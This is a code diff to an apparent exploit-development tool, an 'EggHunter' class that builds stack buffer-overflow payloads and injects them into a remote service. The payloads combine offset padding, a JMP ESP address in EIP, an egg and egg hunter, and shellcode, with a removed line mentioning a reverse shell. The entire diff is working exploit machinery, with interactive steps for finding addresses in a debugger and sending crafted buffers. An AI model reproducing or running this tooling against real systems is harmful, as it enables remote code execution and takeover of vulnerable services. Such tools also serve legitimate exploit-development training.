@@ -58,7 +58,10 @@ class EggHunter:
         _hunter_end = self.str_encode("\x90" * 4)  # 4 bytes is lost when hunter iniates
 
         if(sendHunter != False):
+
             _hunter = _hunter_begin + self.hunter + _hunter_end
+            print("[*] Egg Hunter Generated between 4 NOPS", str(_hunter))
+
             _offset = self.str_encode("A" * (self.config.offset - len(_hunter))) + _hunter
         else:
             _offset = self.str_encode("A" * self.config.offset)
@@ -73,14 +76,18 @@ class EggHunter:
         else:
             _esp = self.str_encode("C" * 4)
 
-        buffer = _offset + _eip + _esp + self.str_encode(self.config.egg)
-
+        buffer = _offset + _eip + _esp
         buffer += self.str_encode("\r\n")
 
-        if(self.config.payload != ""):
-            _shellcode = self.config.payload
+        if(sendHunter != False):
+            _shellcode = self.str_encode(self.config.egg)
         else:
-            _shellcode = self.str_encode("D" * 400)
+            _shellcode = b""
+
+        if(self.config.payload != ""):
+            _shellcode += self.config.payload
+        else:
+            _shellcode += self.str_encode("D" * 400)
 
         self.config.shellcode = _shellcode
 
@@ -116,6 +123,9 @@ class EggHunter:
                     gonext = System.input(
                         "[!] All set! Press ENTER when your application is ready to receive a crafted buffer in EIP :")
 
+                    buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, self.stack_fill(False),
+                                                  self.config.shellcode, self.offset)
+
                     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                     print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to get JMP ESP!!!")
 
@@ -123,6 +133,7 @@ class EggHunter:
                     self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address (eg. 011EFB28) :")
 
                 else:
+                    print(self.config.jmpesp_add)
                     self.config.jmpesp_add = _jmpesp_add
 
                 if (self.config.mode == "http"):
@@ -134,7 +145,11 @@ class EggHunter:
                 gonext = System.input("[!] All set! Do you wanna test the JMP ESP in EIP? [Y/n]:")
 
                 if(gonext.upper() == "Y"):
-                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
+
+                    gonext = System.input(
+                        "[!] All set! Press ENTER when your application is ready to receive a crafted buffer in EIP :")
+
+                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, False)
                     print("[+] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
             else:
                 print("[!] JMP ESP Address reload from previous sessions:" + self.config.jmpesp_add)
@@ -146,10 +161,10 @@ class EggHunter:
             #
             # if(_egg != self.config.egg):
             #     self.config.egg = _egg
-            #     self.config.hunter = System.input("[?] Change default EggHunter : ")
+            #     self.hunter = System.input("[?] Change default EggHunter : ")
 
-            gonext = System.input("[?] Do you wanna test the EggHunter ? [Y/n]")
-            if (gonext.upper() == "Y"):
+            gonext = System.input("[?] Do you wanna skip testing the EggHunter ? [Y/n]")
+            if (gonext.upper() == "N"):
                 if (self.config.mode == "http"):
                     buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                                   self.stack_fill(True), self.config.shellcode, self.config.offset)
@@ -168,7 +183,7 @@ class EggHunter:
 
             if (self.config.dest_address == "" and self.config.src_address == ""):
                 _src_address = System.input("[?] Enter the CCCC memory address (eg. 011EFB28) :")
-                _dest_address = System.input("[?] Enter the destination memory address (eg. 011EFAF4) :")
+                _dest_address = System.input("[?] Enter the address to insert EggHunter [" + str(hex(int("0x" + _src_address, 16) - 40)) + "] :")
 
                 try:
                     self.config.src_address = int("0x" + _src_address, 16)
@@ -186,7 +201,7 @@ class EggHunter:
                 # print(_instruction)
 
             _instruction = HexUtil.hex_string_format(_instruction)
-            gonext = System.input("[?] Do you wanna test the OPCODE " + self.config.instruction + " ? [Y/n]")
+            gonext = System.input("[?] Do you wanna test the OPCODE " + _instruction + " ? [Y/n]")
 
             if (gonext.upper() == "Y"):
                 gonext = System.input(
@@ -226,8 +241,6 @@ class EggHunter:
 
             #########################################################
             # SHELLCODE
-
-            print("[!] Preparing Shellcode for reverse shell.....")
 
             self.config.payload = System.shellcode(self.config)
 
